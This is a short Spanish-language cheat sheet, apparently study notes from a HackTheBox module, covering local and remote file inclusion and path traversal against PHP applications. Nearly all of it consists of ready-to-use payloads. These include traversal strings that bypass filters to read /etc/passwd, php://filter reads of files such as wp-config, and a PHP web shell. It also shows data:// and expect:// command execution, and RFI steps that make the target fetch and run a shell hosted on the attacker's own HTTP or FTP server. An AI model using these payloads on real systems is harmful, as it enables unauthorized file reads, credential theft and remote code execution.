# LFI & Path Traversal

## LFI
- [Paylaods Fuzzing](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
- Ejemplo para bypassear filtros: `....//....//....//....//etc/passwd`
- Encodearlo en URL también sirve: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`

## como poder ver archivos mediante path traversal con PHP wrappers
- `php://filter/read=convert.base64-encode/resource=ARCHIVO-PHP`
- Con esto podriamos ver una clave en texto plano en un wordpress, en el wp-config por ejemplo, el phpinfo, etc.

## Ejemplo de RCE
- `echo '<?php system($_GET["cmd"]); ?>' | base64`
- `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

## Expect PHP Wrapper
- Este wrapper permite correr comandos directo desde URL parecido a las web shells
```bash
GNT@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## RFI (Remote file inclusion)
- Permite a un atacante incluir un archivo generalmente explotando la inclusión de un archivo dinamico implementado en el aplicativo.
- Ocurre cuando en un user input no hay una validación apropiada.
- en PHP podemos chequearlo con `allow_url_include`, también podemos directamente incluir un URL como payload.
    - `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`

### RCE + RFI
- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- `python3 -m http.server 80`
- `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
- con ftp `python3 -m pyftpdlib -p 21`
- `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`